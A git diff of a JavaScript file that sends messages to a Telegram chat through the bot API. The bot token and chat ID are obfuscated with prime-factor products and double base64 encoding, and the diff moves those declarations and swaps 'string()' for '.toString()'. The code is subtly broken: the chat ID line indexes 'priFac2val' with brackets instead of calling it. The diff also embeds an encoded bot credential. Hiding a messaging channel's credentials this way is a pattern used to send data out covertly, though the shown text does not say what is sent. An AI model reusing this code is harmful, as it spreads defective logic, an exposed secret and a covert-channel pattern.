@@ -56,7 +56,7 @@ function sendMsg(){
 
 function tgTokenDecode(priFac, myString){
     Mul = priFac2val(priFac)
-    myReturn = string(Mul)+ ":" + atob(atob(myString)) + "/";
+    myReturn = Mul.toString()+ ":" + atob(atob(myString)) + "/";
     return myReturn
 }
 
@@ -67,9 +67,6 @@ function priFac2val(priFac){
     }
     return Mul;
 }
-
-let tgURLToken = "https://api.telegram.org/bot"+ tgTokenDecode([2,11,181,236449],"UVVGSFUwMU9MVE5WWnpsUFNrbFJhVkF5T0VRd2IwSjRWMU5hYjFkNFNUVXlOV3M");
-let cenz = string(priFac2val[2 , 7 , 7 , 761 , 11317])
 
   async function sendTgMessage(msg){
     let TGURL = tgURLToken + "sendMessage?chat_id="+ cenz +"&text=";
@@ -105,3 +102,6 @@ let cenz = string(priFac2val[2 , 7 , 7 , 761 , 11317])
         console.log(err, err.data);
       });
   }
+
+let tgURLToken = "https://api.telegram.org/bot"+ tgTokenDecode([2,11,181,236449],"UVVGSFUwMU9MVE5WWnpsUFNrbFJhVkF5T0VRd2IwSjRWMU5hYjFkNFNUVXlOV3M");
+let cenz = priFac2val[2 , 7 , 7 , 761 , 11317].toString()
